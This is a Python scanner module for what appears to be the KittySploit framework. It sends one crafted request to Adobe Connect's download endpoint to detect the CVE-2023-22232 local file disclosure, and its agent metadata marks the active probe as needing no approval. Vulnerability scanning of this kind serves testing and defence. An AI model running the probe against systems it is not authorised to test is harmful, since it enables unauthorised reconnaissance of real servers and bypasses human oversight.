#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Adobe Connect versions 11."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Adobe Connect < 12.1.5 - Local File Disclosure Detection',
        'description': 'Adobe Connect versions 11.4.5 (and earlier), 12.1.5 (and earlier) are affected by an Improper Access Control vulnerability that could result in a Security feature bypass. An attacker could leverage this vulnerability to impact the integrity of a minor feature. Exploitation of this issue does not require user interaction',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'packetstorm', 'cve2023', 'adobe', 'lfd', 'download', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://helpx.adobe.com/security/products/connect/apsb23-05.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-22232',
            'http://packetstormsecurity.com/files/171390/Adobe-Connect-11.4.5-12.1.5-Local-File-Disclosure.html',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2023-22232',
    }

    def run(self):
        r = self.http_request(method="GET", path='/system/download?download-url=/_a7/p49dm7f4qjyt/output/&name=exam.pdf', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('Save to My Computer', 'exam.pdf', 'Click to Download',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="Adobe Connect < 12.1.5 - Local File Disclosure detected",
                path='/system/download?download-url=/_a7/p49dm7f4qjyt/output/&name=exam.pdf',
            )
            return True
        return False

